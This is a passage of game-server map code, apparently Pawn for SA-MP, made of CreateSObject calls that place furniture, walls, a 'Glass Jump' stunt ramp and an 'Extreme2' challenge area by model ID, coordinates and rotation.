	CreateSObject(1723, -2839.97876, 2236.34985, 3.79680,   0.00000, 0.00000, 270.00000);
	CreateSObject(2312, -2842.55469, 2231.96069, 5.98110,   0.00000, 0.00000, 180.00000);
	CreateSObject(2267, -2839.43384, 2235.16772, 5.95946,   0.00000, 0.00000, 270.00000);
	CreateSObject(949, -2839.90967, 2237.35400, 4.48110,   0.00000, 0.00000, 0.00000);
	CreateSObject(2047, -2847.35303, 2229.34546, 5.69260,   0.00000, 0.00000, 180.00000);
	CreateSObject(2358, -2850.27734, 2229.57568, 5.08490,   0.00000, 0.00000, 180.00000);
	CreateSObject(2358, -2852.09766, 2229.51123, 6.52763,   0.00000, 0.00000, 180.00000);
	CreateSObject(2358, -2850.69800, 2229.59229, 5.80630,   0.00000, 0.00000, 180.00000);
	CreateSObject(2358, -2852.09766, 2229.51123, 5.08490,   0.00000, 0.00000, 180.00000);
	CreateSObject(356, -2857.38696, 2234.76196, 5.18550,   90.00000, 0.00000, 180.00000);
	CreateSObject(355, -2858.01074, 2235.52051, 4.85390,   90.00000, 2.00000, 0.00000);
	CreateSObject(352, -2857.91016, 2235.38330, 5.23280,   90.00000, 0.00000, 0.00000);
	CreateSObject(353, -2857.73926, 2234.99243, 4.95280,   90.00000, 0.00000, 0.00000);
	CreateSObject(351, -2852.42993, 2229.65552, 5.37820,   0.00000, 0.00000, 0.00000);
	CreateSObject(358, -2850.58301, 2229.59180, 5.40974,   0.00000, 0.00000, 0.00000);
	CreateSObject(348, -2859.55322, 2245.58789, 4.97580,   90.00000, 0.00000, 180.00000);
	CreateSObject(350, -2860.56250, 2245.57349, 4.96460,   90.00000, 0.00000, 180.00000);
	CreateSObject(347, -2861.82080, 2245.78320, 4.99780,   35.00000, 0.00000, 180.00000);
	CreateSObject(363, -2859.38428, 2245.73828, 5.28040,   0.00000, 0.00000, 0.00000);
	CreateSObject(364, -2858.64673, 2245.53809, 4.96040,   0.00000, 0.00000, 55.00000);
	CreateSObject(349, -2857.05151, 2245.60303, 5.02840,   90.00000, 0.00000, 180.00000);
	CreateSObject(344, -2856.36548, 2245.51660, 5.17960,   0.00000, 0.00000, 0.00000);
	CreateSObject(343, -2855.81250, 2245.58691, 5.04410,   0.00000, 0.00000, 0.00000);
	CreateSObject(343, -2855.37744, 2245.53931, 4.97410,   90.00000, 0.00000, 130.00000);
	CreateSObject(344, -2856.19238, 2245.56958, 5.17960,   0.00000, 0.00000, 0.00000);
	CreateSObject(344, -2856.62646, 2245.53760, 5.15960,   0.00000, 0.00000, 0.00000);
	CreateSObject(363, -2858.21289, 2245.73657, 5.02040,   270.00000, 0.00000, 24.00000);
	CreateSObject(343, -2855.08301, 2245.59082, 5.04410,   0.00000, 0.00000, 0.00000);
	CreateSObject(372, -2851.92847, 2235.01270, 4.26550,   90.00000, 0.00000, 180.00000);
	CreateSObject(346, -2851.98950, 2234.91992, 4.88890,   90.00000, 0.00000, 180.00000);
	CreateSObject(1716, -2841.02490, 2242.46045, 3.84630,   0.00000, 0.00000, 0.00000);
	CreateSObject(373, -2839.62109, 2240.62061, 5.30000,   -30.00000, -60.00000, 0.00000);
	CreateSObject(2459, -2851.92847, 2240.01318, 3.73698,   0.00000, 0.00000, 0.00000);
	CreateSObject(359, -2851.22412, 2240.51416, 4.94030,   90.00000, 0.00000, 0.00000);
	CreateSObject(362, -2851.70190, 2239.59473, 4.86370,   90.00000, 0.00000, 30.00000);
	CreateSObject(2459, -2858.67310, 2239.97852, 3.73698,   0.00000, 0.00000, 0.00000);
	CreateSObject(361, -2858.20874, 2240.18921, 5.09960,   90.00000, 0.00000, 30.00000);
	CreateSObject(360, -2857.84277, 2239.61816, 5.11650,   -90.00000, 0.00000, 0.00000);
	CreateSObject(1744, -2856.21289, 2245.97949, 4.62800,   0.00000, 0.00000, 0.00000);
	CreateSObject(1744, -2857.67676, 4.62840, 5.13800,   0.00000, 0.00000, 0.00000);
	CreateSObject(1744, -2859.14014, 2245.98999, 4.62800,   0.00000, 0.00000, 0.00000);
	CreateSObject(1744, -2860.58301, 2246.00024, 4.62840,   0.00000, 0.00000, 0.00000);
	CreateSObject(1744, -2862.05957, 2245.98096, 4.62800,   0.00000, 0.00000, 0.00000);
	CreateSObject(2056, -2864.90112, 2232.91602, 6.18067,   0.00000, 0.00000, 0.00000);
	CreateSObject(19461, -2861.18555, 2224.56494, 5.60000,   0.00000, 0.00000, 0.00000);
	CreateSObject(18036, -2876.26221, 2237.47095, 5.85000,   0.00000, 0.00000, 0.00000);
	CreateSObject(18051, -2873.92603, 2239.78101, 5.34000,   0.00000, 0.00000, 0.00000);
	CreateSObject(19397, -2862.20044, 2229.33789, 5.60000,   0.00000, 0.00000, 90.00000);
	CreateSObject(19461, -2868.27246, 2229.34131, 5.60000,   0.00000, 0.00000, 90.00000);
	CreateSObject(1492, -2862.96802, 2229.33057, 3.83760,   0.00000, 0.00000, 0.00000);
	CreateSObject(2056, -2855.94019, 2245.78418, 5.92901,   0.00000, 0.00000, 0.00000);
	CreateSObject(2051, -2867.69531, 2229.39746, 5.40700,   0.00000, 0.00000, 180.00000);
	CreateSObject(2049, -2861.68994, 2245.74390, 6.30155,   0.00000, 0.00000, 0.00000);
	CreateSObject(1492, -2864.66626, 2230.71729, 3.87000,   0.00000, 0.00000, 90.00000);
	CreateSObject(19461, -2864.62085, 2237.87769, 5.60000,   0.00000, 0.00000, 0.00000);
	CreateSObject(19397, -2864.62476, 2231.46045, 5.60000,   0.00000, 0.00000, 0.00000);
	CreateSObject(18050, -2869.75000, 2239.32886, 6.62910,   0.00000, 0.00000, 0.00000);
	CreateSObject(18032, -2867.53052, 2239.77417, 5.34850,   0.00000, 0.00000, 0.00000);
	CreateSObject(1714, -2840.18799, 2230.00659, 3.82030,   0.00000, 0.00000, 270.00000);
	CreateSObject(2165, -2841.57397, 2229.25439, 3.87000,   0.00000, 0.00000, 90.00000);
	CreateSObject(2166, -2841.59204, 2230.14722, 3.87210,   0.00000, 0.00000, 0.00000);
	CreateSObject(2202, -2840.22998, 2227.65259, 3.83060,   0.00000, 0.00000, 180.00000);
	CreateSObject(1492, -2844.96362, 2231.82983, 3.83760,   0.00000, 0.00000, 0.00000);
	CreateSObject(1715, -2842.92065, 2230.55396, 3.82860,   0.00000, 0.00000, 90.00000);
	CreateSObject(2164, -2843.47070, 2227.17920, 3.84180,   0.00000, 0.00000, 180.00000);
	CreateSObject(2162, -2845.68286, 2228.25391, 3.85020,   0.00000, 0.00000, 90.00000);
	CreateSObject(2163, -2845.70996, 2230.09204, 3.81580,   0.00000, 0.00000, 90.00000);
	CreateSObject(2286, -2839.44336, 2230.56909, 5.84090,   0.00000, 0.00000, 270.00000);
	CreateSObject(19415, -2840.98218, 2231.80688, 5.60000,   0.00000, 0.00000, 90.00000);
	CreateSObject(1616, -2839.82983, 2227.41431, 6.61220,   0.00000, 0.00000, 0.00000);
	CreateSObject(1649, -2841.35693, 2231.88086, 5.65610,   0.00000, 0.00000, 180.00000);
	CreateSObject(1616, -2865.23682, 2229.81641, 6.61220,   0.00000, 0.00000, 9.00000);
	CreateSObject(19461, -2876.76807, 2245.91113, 5.60000,   0.00000, 0.00000, 90.00000);
	CreateSObject(19461, -2884.75684, 2245.91577, 5.60000,   0.00000, 0.00000, 90.00000);
	CreateSObject(19461, -2888.16162, 2245.89624, 5.60000,   0.00000, 0.00000, 90.00000);
	CreateSObject(19461, -2892.95605, 2241.14917, 5.60000,   0.00000, 0.00000, 0.00000);
	CreateSObject(19461, -2876.37256, 2229.26758, 5.60000,   0.00000, 0.00000, 90.00000);
	CreateSObject(19461, -2884.79175, 2229.27051, 5.60000,   0.00000, 0.00000, 90.00000);
	CreateSObject(19461, -2892.94653, 2233.85229, 5.60000,   0.00000, 0.00000, 0.00000);
	CreateSObject(19461, -2888.13623, 2229.25635, 5.60000,   0.00000, 0.00000, 90.00000);
	CreateSObject(2614, -2864.46094, 2235.47998, 6.16567,   0.00000, 0.00000, 90.00000);
	CreateSObject(1583, -2864.54028, 2239.34326, 5.07710,   0.00000, 0.00000, 90.00000);
	CreateSObject(1584, -2864.57764, 2242.99268, 5.09720,   0.00000, 0.00000, 90.00000);
	CreateSObject(1585, -2856.30591, 2229.39063, 5.09520,   0.00000, 0.00000, 180.00000);
	CreateSObject(19377, -2844.50195, 2241.17310, 7.43180,   0.00000, 90.00000, 0.00000);
	CreateSObject(19377, -2850.97339, 2234.09595, 7.43140,   0.00000, 90.00000, 0.00000);
	CreateSObject(19377, -2859.40796, 2234.07910, 7.43110,   0.00000, 90.00000, 0.00000);
	CreateSObject(19377, -2859.40576, 2241.11475, 7.43170,   0.00000, 90.00000, 0.00000);
	CreateSObject(19377, -2854.01855, 2241.17749, 7.43070,   0.00000, 90.00000, 0.00000);
	CreateSObject(19377, -2844.42480, 2231.50732, 7.43160,   0.00000, 90.00000, 0.00000);
	CreateSObject(19377, -2869.91284, 2234.05444, 7.43900,   0.00000, 90.00000, 0.00000);
	CreateSObject(19377, -2869.77466, 2241.12305, 7.43110,   0.00000, 90.00000, 0.00000);
	CreateSObject(19377, -2880.34985, 2234.06445, 7.43110,   0.00000, 90.00000, 0.00000);
	CreateSObject(19377, -2880.36743, 2241.16382, 7.43010,   0.00000, 90.00000, 0.00000);
	CreateSObject(19377, -2887.87036, 2234.05420, 7.43400,   0.00000, 90.00000, 0.00000);
	CreateSObject(19377, -2887.69727, 2241.14307, 7.43150,   0.00000, 90.00000, 0.00000);
	CreateSObject(2269, -2845.22095, 2229.09717, 5.66150,   0.00000, 0.00000, 90.00000);
	CreateSObject(1744, -2857.68774, 2245.97925, 4.62840,   0.00000, 0.00000, 0.00000);
	CreateSObject(19377, -2844.46436, 2224.26416, 7.43110,   0.00000, 90.00000, 0.00000);
	CreateSObject(19377, -2864.92896, 2224.43970, 7.43110,   0.00000, 90.00000, 0.00000);
	CreateSObject(2775, -2845.31934, 2229.63062, 6.72829,   0.00000, 0.00000, 90.00000);
	CreateSObject(1778, -2864.42065, 2228.79272, 3.84830,   0.00000, 0.00000, 90.00000);
	CreateSObject(14527, -2852.20532, 2237.58813, 4.71850,   0.00000, 0.00000, 0.00000);
	CreateSObject(14527, -2857.75513, 2237.56079, 4.71850,   0.00000, 0.00000, 0.00000);
	CreateSObject(2525, -2862.99731, 2226.12158, 3.86080,   0.00000, 0.00000, 180.00000);
	CreateSObject(2524, -2861.74316, 2228.07568, 3.84380,   0.00000, 0.00000, 270.00000);
	CreateSObject(2718, -2863.74292, 2229.32642, 5.68601,   0.00000, 0.00000, 0.00000);
	CreateSObject(2826, -2842.66650, 2242.83887, 4.71154,   0.00000, 0.00000, 0.00000);
	CreateSObject(2828, -2840.60742, 2231.41260, 4.66290,   0.00000, 0.00000, 180.00000);
	CreateSObject(2855, -2845.53125, 2228.84985, 4.36650,   0.00000, 0.00000, 90.00000);
	CreateSObject(2854, -2845.42969, 2230.37671, 4.78810,   0.00000, 0.00000, 90.00000);
	CreateSObject(19461, -2862.75439, 2225.54297, 5.60000,   0.00000, 0.00000, 90.00000);
	CreateSObject(19397, -2853.04810, 2245.91260, 5.60000,   0.00000, 0.00000, 90.00000);
	CreateSObject(19397, -2854.53784, 2245.91260, 5.60000,   0.00000, 0.00000, 90.00000);
	// Glass Jump
	CreateSObject(16358, 376.20001, -2533.30005, 660.70001,   0.00000, 346.00000, 270.00000);
	CreateSObject(16358, 376.20001, -2279.10010, 579.29999,   0.00000, 339.99799, 270.00000);
	CreateSObject(16358, 376.20001, -2003.19995, 450.79999,   0.00000, 332.49399, 270.00000);
	CreateSObject(16358, 376.20001, -1790.40002, 340.00000,   0.00000, 332.49399, 270.00000);
	CreateSObject(16358, 376.20001, -1577.69995, 229.20000,   0.00000, 332.48499, 270.00000);
	CreateSObject(3851, 375.79999, -2630.30005, 687.20001,   0.00000, 18.00000, 90.00000);
	CreateSObject(3851, 375.79999, -2619.50000, 684.50000,   0.00000, 17.99600, 90.00000);
	CreateSObject(3851, 375.79999, -2608.69995, 681.79999,   0.00000, 17.99100, 90.00000);
	CreateSObject(3851, 375.79999, -2597.89990, 679.09998,   0.00000, 17.98700, 90.00000);
	CreateSObject(3851, 375.79999, -2587.09985, 676.39996,   0.00000, 17.98200, 90.00000);
	CreateSObject(3851, 375.79999, -2576.29980, 673.69995,   0.00000, 17.97800, 90.00000);
	CreateSObject(3851, 375.79999, -2565.49976, 670.99994,   0.00000, 17.97400, 90.00000);
	CreateSObject(3851, 375.79999, -2554.69971, 668.29993,   0.00000, 17.96900, 90.00000);
	CreateSObject(3851, 375.79999, -2543.89966, 665.59991,   0.00000, 17.96500, 90.00000);
	CreateSObject(3851, 375.79999, -2533.09961, 662.89990,   0.00000, 17.96000, 90.00000);
	CreateSObject(3851, 375.79999, -2522.29956, 660.19989,   0.00000, 17.95600, 90.00000);
	CreateSObject(3851, 375.79999, -2511.49951, 657.49988,   0.00000, 17.95200, 90.00000);
	CreateSObject(3851, 375.79999, -2500.69946, 654.79987,   0.00000, 17.94700, 90.00000);
	CreateSObject(3851, 375.79999, -2489.89941, 652.09985,   0.00000, 17.94300, 90.00000);
	CreateSObject(3851, 375.79999, -2479.09937, 649.39984,   0.00000, 17.93800, 90.00000);
	CreateSObject(3851, 375.79999, -2468.29932, 646.69983,   0.00000, 17.93400, 90.00000);
	CreateSObject(3851, 375.79999, -2457.49927, 643.99982,   0.00000, 17.93000, 90.00000);
	CreateSObject(3851, 375.79999, -2446.69922, 641.29980,   0.00000, 17.92500, 90.00000);
	CreateSObject(3851, 375.79999, -2435.89917, 638.59979,   0.00000, 17.92100, 90.00000);
	CreateSObject(3851, 375.79999, -2425.09912, 635.89978,   0.00000, 17.91700, 90.00000);
	CreateSObject(3851, 375.79999, -2414.29907, 633.19977,   0.00000, 17.91200, 90.00000);
	CreateSObject(3851, 375.79999, -2388.30005, 621.29999,   0.00000, 25.75000, 91.85100);
	CreateSObject(3851, 375.79999, -2376.00000, 616.90002,   0.00000, 25.74600, 91.84600);
	CreateSObject(3851, 375.79999, -2363.69995, 612.50006,   0.00000, 25.74300, 91.84000);
	CreateSObject(3851, 375.79999, -2351.39990, 608.10010,   0.00000, 25.73900, 91.83500);
	CreateSObject(3851, 375.79999, -2339.09985, 603.70013,   0.00000, 25.73600, 91.83000);
	CreateSObject(3851, 375.79999, -2326.80005, 599.20001,   0.00000, 25.73000, 91.82400);
	CreateSObject(3851, 375.79999, -2314.50000, 594.79999,   0.00000, 25.72400, 91.81800);
	CreateSObject(3851, 375.79999, -2302.19995, 590.20001,   0.00000, 25.72400, 91.81300);
	CreateSObject(3851, 375.79999, -2289.89990, 585.79999,   0.00000, 25.71900, 91.80700);
	CreateSObject(3851, 375.79999, -2277.60010, 581.29999,   0.00000, 25.71400, 91.80200);
	CreateSObject(3851, 375.79999, -2265.30005, 576.79999,   0.00000, 25.71400, 91.79600);
	CreateSObject(3851, 375.79999, -2253.00000, 572.29999,   0.00000, 25.70800, 91.79100);
	CreateSObject(3851, 375.79999, -2240.69995, 567.79999,   0.00000, 25.70300, 91.78500);
	CreateSObject(3851, 375.79999, -2228.39990, 563.40002,   0.00000, 25.70300, 91.78000);
	CreateSObject(3851, 375.79999, -2216.10010, 558.90002,   0.00000, 25.69700, 91.77400);
	CreateSObject(3851, 375.79999, -2203.80005, 554.40002,   0.00000, 25.69200, 91.76900);
	CreateSObject(3851, 375.79999, -2191.50000, 549.90002,   0.00000, 25.69200, 91.76300);
	CreateSObject(3851, 375.79999, -2179.19995, 545.29999,   0.00000, 25.68600, 91.75800);
	CreateSObject(3851, 375.79999, -2165.10010, 539.70001,   0.00000, 25.68600, 91.75200);
	CreateSObject(3851, 375.79999, -2105.19995, 506.29999,   0.00000, 28.18600, 91.75200);
	CreateSObject(3851, 375.79999, -2096.10010, 501.60001,   0.00000, 28.18500, 91.75200);
	CreateSObject(3851, 375.79999, -2087.00024, 496.90002,   0.00000, 28.18500, 91.75200);
	CreateSObject(3851, 375.79999, -2077.90039, 492.20004,   0.00000, 28.18400, 91.75200);
	CreateSObject(3851, 375.79999, -2068.80054, 487.50006,   0.00000, 28.18400, 91.75200);
	CreateSObject(3851, 375.79999, -2059.70068, 482.80008,   0.00000, 28.18300, 91.75200);
	CreateSObject(3851, 375.79999, -2050.60010, 478.00000,   0.00000, 28.18000, 91.75200);
	CreateSObject(3851, 375.79999, -2041.50000, 473.29999,   0.00000, 28.18000, 91.75200);
	CreateSObject(3851, 375.79999, -2032.40002, 468.60001,   0.00000, 28.18000, 91.75200);
	CreateSObject(3851, 375.79999, -2023.30005, 463.89999,   0.00000, 28.18000, 91.75200);
	CreateSObject(3851, 375.79999, -2014.19995, 459.00000,   0.00000, 28.18000, 91.75200);
	CreateSObject(3851, 375.79999, -2005.09998, 454.39999,   0.00000, 28.17400, 91.75200);
	CreateSObject(3851, 375.79999, -1996.00000, 449.60001,   0.00000, 28.16900, 91.75200);
	CreateSObject(3851, 375.79999, -1986.90002, 444.79999,   0.00000, 28.16300, 91.75200);
	CreateSObject(3851, 375.79999, -1977.80005, 440.10001,   0.00000, 28.15200, 91.75200);
	CreateSObject(3851, 375.79999, -1968.69995, 435.39999,   0.00000, 28.14700, 91.75200);
	CreateSObject(3851, 375.79999, -1959.59998, 430.70001,   0.00000, 28.14100, 91.75200);
	CreateSObject(3851, 375.79999, -1950.50000, 426.00000,   0.00000, 28.13600, 91.75200);
	CreateSObject(3851, 375.79999, -1941.40002, 421.20001,   0.00000, 28.13000, 91.75200);
	CreateSObject(3851, 375.79999, -1932.30005, 416.50000,   0.00000, 28.12500, 91.75200);
	CreateSObject(3851, 375.79999, -1923.19995, 411.70001,   0.00000, 28.12000, 91.75200);
	CreateSObject(3851, 375.79999, -1914.09998, 406.89999,   0.00000, 28.11400, 91.75200);
	CreateSObject(3851, 375.79999, -1905.00000, 402.20001,   0.00000, 28.11400, 91.75200);
	CreateSObject(3851, 375.79999, -1895.90002, 397.39999,   0.00000, 28.10900, 91.75200);
	CreateSObject(3851, 375.79999, -1886.80005, 392.79999,   0.00000, 28.10300, 91.75200);
	CreateSObject(3851, 375.79999, -1877.69995, 388.00000,   0.00000, 28.09800, 91.75200);
	CreateSObject(3851, 375.79999, -1868.59998, 383.29999,   0.00000, 28.09200, 91.75200);
	CreateSObject(3851, 375.79999, -1859.50000, 378.60001,   0.00000, 28.08700, 91.75200);
	CreateSObject(3851, 375.79999, -1850.40002, 373.79999,   0.00000, 28.08100, 91.75200);
	CreateSObject(3851, 375.79999, -1841.30005, 369.10001,   0.00000, 28.07600, 91.75200);
	CreateSObject(3851, 375.79999, -1832.19995, 364.29999,   0.00000, 28.06500, 91.75200);
	CreateSObject(3851, 375.79999, -1823.09998, 359.70001,   0.00000, 28.05900, 91.75200);
	CreateSObject(3851, 375.79999, -1814.00000, 354.89999,   0.00000, 28.05400, 91.75200);
	CreateSObject(3851, 375.79999, -1804.90002, 350.10001,   0.00000, 28.04800, 91.75200);
	CreateSObject(3851, 375.79999, -1795.80005, 345.39999,   0.00000, 28.04300, 91.75200);
	CreateSObject(3851, 375.79999, -1786.69995, 340.70001,   0.00000, 28.03700, 91.75200);
	CreateSObject(3851, 375.79999, -1777.59998, 336.10001,   0.00000, 28.03200, 91.75200);
	CreateSObject(3851, 375.79999, -1768.50000, 331.10001,   0.00000, 28.02600, 91.75200);
	CreateSObject(3851, 375.79999, -1759.40002, 326.39999,   0.00000, 28.02100, 91.75200);
	CreateSObject(3851, 375.79999, -1750.30005, 321.70001,   0.00000, 28.02100, 91.75200);
	CreateSObject(3851, 375.79999, -1741.19995, 316.89999,   0.00000, 28.01500, 91.75200);
	CreateSObject(3851, 375.79999, -1732.09998, 312.29999,   0.00000, 28.01000, 91.75200);
	CreateSObject(3851, 375.79999, -1723.00000, 307.50000,   0.00000, 28.00400, 91.75200);
	CreateSObject(3851, 375.79999, -1713.90002, 302.70001,   0.00000, 27.99900, 91.75200);
	CreateSObject(3851, 375.79999, -1704.80005, 298.00000,   0.00000, 27.99300, 91.75200);
	CreateSObject(3851, 375.79999, -1695.69995, 293.29999,   0.00000, 27.98800, 91.75200);
	CreateSObject(3851, 375.79999, -1686.59998, 288.50000,   0.00000, 27.97700, 91.75200);
	CreateSObject(3851, 375.79999, -1677.50000, 283.70001,   0.00000, 27.97100, 91.75200);
	CreateSObject(3851, 375.79999, -1668.40002, 279.00000,   0.00000, 27.96600, 91.75200);
	CreateSObject(3851, 375.79999, -1659.30005, 274.29999,   0.00000, 27.96000, 91.75200);
	CreateSObject(3851, 375.79999, -1650.19995, 269.60001,   0.00000, 27.95500, 91.75200);
	CreateSObject(3851, 375.79999, -1641.09998, 264.89999,   0.00000, 27.94900, 91.75200);
	CreateSObject(3851, 375.79999, -1632.00000, 260.10001,   0.00000, 27.94400, 91.75200);
	CreateSObject(3851, 375.79999, -1622.90002, 255.39999,   0.00000, 27.93800, 91.75200);
	CreateSObject(3851, 375.79999, -1613.80005, 250.60001,   0.00000, 27.93300, 91.75200);
	CreateSObject(3851, 375.79999, -1604.69995, 245.89999,   0.00000, 27.93300, 91.75200);
	CreateSObject(3851, 375.79999, -1595.59998, 241.00000,   0.00000, 27.92700, 91.75200);
	CreateSObject(3851, 375.79999, -1586.50000, 236.30000,   0.00000, 27.92200, 91.75200);
	CreateSObject(3851, 375.79999, -1577.40002, 231.60001,   0.00000, 27.91600, 91.75200);
	CreateSObject(3851, 375.79999, -1568.30005, 226.80000,   0.00000, 27.91100, 91.75200);
	CreateSObject(3851, 375.79999, -1559.19995, 222.20000,   0.00000, 27.90500, 91.75200);
	CreateSObject(3851, 375.79999, -1550.09998, 217.39999,   0.00000, 27.90000, 91.75200);
	CreateSObject(3851, 375.79999, -1541.00000, 212.70000,   0.00000, 27.89400, 91.75200);
	CreateSObject(3851, 375.79999, -1531.90002, 208.00000,   0.00000, 27.88300, 91.75200);
	CreateSObject(3851, 375.79999, -1522.80005, 203.20000,   0.00000, 27.87800, 91.75200);
	CreateSObject(3851, 375.79999, -1513.69995, 198.39999,   0.00000, 27.87200, 91.75200);
	CreateSObject(3851, 375.79999, -1504.59998, 193.70000,   0.00000, 27.86700, 91.75200);
	CreateSObject(3851, 375.79999, -1495.50000, 188.89999,   0.00000, 27.86100, 91.75200);
	CreateSObject(3851, 375.79999, -1486.40002, 184.30000,   0.00000, 27.85600, 91.75200);
	CreateSObject(3851, 375.79999, -1477.30005, 179.30000,   0.00000, 27.85000, 89.75200);
	CreateSObject(1634, 379.89999, -1472.40002, 175.30000,   325.25000, 0.00000, 0.00000);
	CreateSObject(1634, 372.00000, -1472.40002, 175.30000,   325.24500, 0.00000, 0.00000);
	CreateSObject(1634, 376.00000, -1472.40002, 175.30000,   325.24500, 0.00000, 0.00000);
	CreateSObject(1634, 376.00000, -1463.59998, 175.30000,   343.99500, 0.00000, 0.00000);
	CreateSObject(1634, 371.89999, -1463.59998, 175.30000,   343.99301, 0.00000, 0.00000);
	CreateSObject(1634, 380.10001, -1463.59998, 175.30000,   343.99301, 0.00000, 0.00000);
	CreateSObject(1634, 380.10001, -1455.09998, 178.30000,   3.99300, 0.00000, 0.00000);
	CreateSObject(1634, 376.00000, -1455.09998, 178.30000,   3.98800, 0.00000, 0.00000);
	CreateSObject(1634, 371.89999, -1455.09998, 178.30000,   3.98800, 0.00000, 0.00000);
	CreateSObject(1634, 376.00000, -1448.09998, 184.06400,   23.98800, 0.00000, 0.00000);
	CreateSObject(1634, 371.89999, -1448.09998, 184.06400,   23.98300, 0.00000, 0.00000);
	CreateSObject(1634, 380.10001, -1448.09998, 184.06400,   23.98300, 0.00000, 0.00000);
	CreateSObject(6959, 376.20001, -2667.86499, 689.71948,   0.00000, 0.00000, 0.00000);
	CreateSObject(3851, 381.60001, -2649.89990, 689.70001,   0.00000, 90.00000, 90.00000);
	CreateSObject(3851, 370.29999, -2649.89990, 689.70001,   0.00000, 90.00000, 90.00000);
	CreateSObject(3437, 366.10001, -2663.50000, 688.50000,   0.00000, 90.00000, 70.00000);
	CreateSObject(3437, 385.50000, -2663.50000, 688.50000,   0.00000, 90.00000, 110.00100);
	CreateSObject(3437, 384.29999, -2663.80005, 688.50000,   0.00000, 90.00000, 97.99500);
	CreateSObject(3437, 386.60001, -2663.00000, 688.50000,   0.00000, 90.00000, 121.99200);
	CreateSObject(3437, 389.50000, -2674.50000, 688.50000,   0.00000, 90.00000, 109.99500);
	CreateSObject(3437, 362.10001, -2674.50000, 688.50000,   0.00000, 90.00000, 69.99900);
	CreateSObject(3437, 365.10001, -2663.00000, 688.50000,   0.00000, 90.00000, 58.99200);
	CreateSObject(3437, 367.20001, -2663.80005, 688.50000,   0.00000, 90.00000, 80.99100);
	CreateSObject(3441, 356.89999, -2686.19995, 691.70001,   0.00000, 0.00000, 0.00000);
	CreateSObject(3441, 395.50000, -2686.19995, 691.70001,   0.00000, 0.00000, 0.00000);
	CreateSObject(3441, 395.50000, -2649.19995, 691.70001,   0.00000, 0.00000, 0.00000);
	CreateSObject(3441, 356.79999, -2649.19995, 691.70001,   0.00000, 0.00000, 0.00000);
	CreateSObject(6959, 376.20001, -2667.89990, 693.70001,   0.00000, 0.00000, 0.00000);
	CreateSObject(6959, 376.20001, -2647.92310, 713.66998,   90.00000, 0.00000, 0.00000);
	CreateSObject(6959, 376.20001, -2647.89990, 669.70001,   90.00000, 0.00000, 0.00000);
	CreateSObject(6959, 376.20001, -2687.89990, 669.70001,   90.00000, 0.00000, 0.00000);
	CreateSObject(6959, 376.20001, -2687.89990, 713.70001,   90.00000, 0.00000, 0.00000);
	CreateSObject(3437, 375.89999, -2649.10010, 725.59998,   0.00000, 0.00000, 90.00000);
	CreateSObject(3437, 375.89999, -2649.10010, 713.90002,   0.00000, 0.00000, 90.00000);
	CreateSObject(3437, 375.89999, -2649.10010, 702.20001,   0.00000, 0.00000, 90.00000);
	CreateSObject(3437, 377.39999, -2649.10010, 702.09998,   14.00000, 0.00000, 90.00000);
	CreateSObject(3437, 374.39999, -2649.10010, 702.09998,   346.00299, 0.00000, 90.00000);
	CreateSObject(9831, 353.89999, -2681.39990, 672.00000,   277.75000, 0.00000, 269.99899);
	CreateSObject(9831, 353.89999, -2673.80005, 672.00000,   277.74500, 0.00000, 269.99500);
	CreateSObject(9831, 353.89999, -2666.19995, 672.00000,   277.74500, 0.00000, 269.99500);
	CreateSObject(9831, 353.89999, -2658.60010, 672.00000,   277.74500, 0.00000, 269.99500);
	CreateSObject(9831, 353.89999, -2651.00000, 672.00000,   277.74500, 0.00000, 269.99500);
	CreateSObject(9831, 359.29999, -2646.19995, 672.00000,   277.74500, 0.00000, 180.24500);
	CreateSObject(9831, 364.20001, -2646.19995, 672.00000,   277.73999, 0.00000, 180.24200);
	CreateSObject(9831, 387.29999, -2646.19995, 672.00000,   277.73999, 0.00000, 180.24200);
	CreateSObject(9831, 394.89999, -2646.19995, 672.00000,   277.73999, 0.00000, 180.24200);
	CreateSObject(9831, 398.60001, -2651.80005, 672.00000,   277.73999, 0.00000, 91.99200);
	CreateSObject(9831, 398.60001, -2659.39990, 672.00000,   277.73999, 0.00000, 91.98900);
	CreateSObject(9831, 398.60001, -2667.00000, 672.00000,   277.73999, 0.00000, 91.98900);
	CreateSObject(9831, 398.79999, -2674.60010, 672.00000,   277.73999, 0.00000, 91.98900);
	CreateSObject(9831, 399.00000, -2682.19995, 672.00000,   277.73999, 0.00000, 91.98900);
	CreateSObject(9831, 399.20001, -2689.39990, 672.00000,   277.73999, 0.00000, 91.98900);
	CreateSObject(9831, 393.50000, -2689.50000, 672.00000,   277.73999, 0.00000, 0.48900);
	CreateSObject(9831, 385.89999, -2689.60010, 672.00000,   277.73999, 0.00000, 0.48300);
	CreateSObject(9831, 378.29999, -2689.60010, 672.00000,   277.73999, 0.00000, 0.48300);
	CreateSObject(9831, 370.70001, -2689.69995, 672.00000,   277.73999, 0.00000, 0.48300);
	CreateSObject(9831, 363.10001, -2689.80005, 672.00000,   277.73999, 0.00000, 0.48300);
	CreateSObject(9831, 355.50000, -2689.80005, 672.00000,   277.73999, 0.00000, 0.48300);
	CreateSObject(9831, 353.89999, -2689.10010, 672.00000,   277.74500, 0.00000, 269.99500);
	CreateSObject(3851, 375.79999, -2631.60010, 693.70001,   0.00000, 0.00000, 90.00000);
	CreateSObject(3515, 381.20001, -2650.19995, 687.79999,   0.00000, 327.25000, 0.00000);
	CreateSObject(3515, 369.89999, -2650.19995, 687.79999,   0.00000, 32.75000, 0.00000);
	CreateSObject(5126, 352.20001, -2632.30005, 697.70001,   0.00000, 0.00000, 0.00000);
	CreateSObject(17031, 350.29999, -2619.39990, 676.90002,   0.00000, 336.00000, 18.00000);
	CreateSObject(17031, 400.20001, -2632.60010, 676.90002,   0.00000, 335.99500, 171.50000);
	CreateSObject(5126, 398.79999, -2632.30005, 697.70001,   0.00000, 0.00000, 180.00000);
	CreateSObject(1387, 371.60001, -2631.60010, 696.40002,   0.00000, 0.00000, 40.00000);
	CreateSObject(1387, 380.10001, -2631.60010, 696.40002,   0.00000, 0.00000, 130.00000);
	// Extreme2
	CreateSObject(18822, 2954.22998, -2052.15991, 13.07000,   0.00000, -69.00000, 179.00000,object_show_distance,0,world_challenges);
	CreateSObject(18809, 2995.45996, -2052.59009, 39.36000,   0.00000, 52.00000, 0.00000,object_show_distance,0,world_challenges);
	CreateSObject(18809, 3034.47998, -2052.55005, 69.80000,   0.00000, 52.00000, 0.00000,object_show_distance,0,world_challenges);
	CreateSObject(18823, 2928.87988, -1234.87000, 33.62000,   0.00000, 0.00000, 0.00000,object_show_distance,0,world_challenges);
	CreateSObject(18826, 3051.63989, -2052.60010, 103.91000,   0.00000, 139.00000, 0.00000,object_show_distance,0,world_challenges);
